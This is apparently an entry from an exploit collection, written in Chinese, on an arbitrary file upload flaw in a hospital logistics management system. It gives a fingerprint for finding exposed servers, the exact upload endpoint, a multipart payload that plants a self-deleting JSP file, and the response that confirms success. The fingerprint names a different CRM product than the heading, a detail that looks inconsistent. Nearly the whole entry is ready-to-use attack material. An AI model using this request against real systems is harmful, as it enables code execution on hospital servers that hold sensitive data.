# 医院一站式后勤管理系统ajaxinvoke接口处存在任意文件上传漏洞

医院一站式后勤管理系统ajaxinvoke接口处 ｜ 文件上传 ｜ —
- **指纹**：`title="欢迎使用浙大恩特客户资源管理系统"`
- **请求**：`POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1`

**Payload**
```
------HhdfhubuerhgbhbgvbhvbVYTCYuhivutu
Content-Disposition: form-data; name="Filedata"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------HhdfhubuerhgbhbgvbhvbVYTCYuhivutu--
```
- **响应特征**：200 apk